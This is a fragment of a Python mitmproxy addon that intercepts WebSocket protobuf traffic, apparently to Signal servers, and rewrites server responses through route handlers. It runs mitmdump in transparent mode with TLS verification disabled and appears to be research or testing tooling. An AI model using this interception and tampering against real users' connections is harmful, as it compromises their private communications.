def _v1_websocket_resp(flow: HTTPFlow, msg):
    ws_msg = WebSocketMessage()
    ws_msg.ParseFromString(msg.content)
    ws_msg = ws_msg.response
    logging.debug(f"WEBSOCKET RESPONSE: {ws_msg}")
    msg.injected = True

    id = ws_msg.id

    if not websocket_open_state.get(id):
        logging.debug(f"Message request does not exist for id {id}: {ws_msg.body}")
        return

    path = websocket_open_state[id].request.path

    websocket_open_state[id].response = ws_msg
    logging.debug(f"Websocket resp with id {id} and path {path}")

    host = flow.request.pretty_host if flow.live else HOST_HTTPBIN
    if "signal" not in host:
        host = HOST_HTTPBIN  # this shouldn't be needed but just to be safe ^^

    f = decap_ws_msg(flow, msg, RouteType.RESPONSE)
    handler, params, _ = ws_resp.find_handler(host, path)
    logging.warning(f"HANDLER (resp): {handler}, PARAMS: {params} -- {host} / {path}")

    if "profile" in path:
        assert handler is not None, f"something went terriblu: {path}"
    if handler:
        msg.injected = True
        resp = handler(f, *params.fixed, **params.named)
        if resp:
            # msg. = resp
            new_ws = WebSocketMessage()
            new_ws.ParseFromString(msg.content)
            new_ws.response.body = resp
            msg.content = new_ws.SerializeToString()


addons = [api]

from mitmproxy.tools.main import mitmdump

if __name__ == "__main__":
    import time
    import config

    flow_name = f"debug_{int(time.time())}.flow"
    f = open(REGISTRATION_INFO_PATH, "wb")
    f.write(b"{}")
    f.close()

    params = [
            # "-q",   # quiet flag, only script's output
            "--mode",
            "transparent",
            "--showhost",
            "--ssl-insecure",
            "--ignore-hosts",
            config.IGNORE_HOSTS,
            "-s",  # script flag
            __file__,  # use the same file as the hook
            # "-r",
            # "mitmproxy_flows/PQ_registration"
            "-w",
            flow_name
        ]
    mitmdump(params)
